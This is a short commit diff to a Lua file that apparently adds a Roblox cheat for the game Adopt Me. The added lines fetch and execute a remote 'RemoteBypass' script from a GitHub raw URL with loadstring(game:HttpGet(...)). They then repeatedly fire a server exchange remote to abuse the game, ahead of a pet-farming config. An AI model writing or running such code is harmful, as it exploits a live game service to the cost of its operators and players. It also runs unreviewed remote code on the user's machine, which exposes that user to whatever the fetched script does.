c2bd70ee84192bfd9a9e0e4f86bdfa7530d10401
greg66n <darien95sm@hotmail.com>
2025-06-20 01:32:24 -0700

    Update adopt.lua

--- adopt.lua
+++ adopt.lua
@@ -1,3 +1,16 @@
+wait(10)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
+wait(1)
+for i = 1, 35 do
+    local args = {
+        "food",
+        "butterfly_2025_snapdragon_flower",
+        1
+    }
+    game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("SocialStonesAPI/AttemptExchange"):FireServer(unpack(args))
+    task.wait(0.2)
+end
+wait(1)
 Config = {
     PetFarm = {
         Enabled = true,
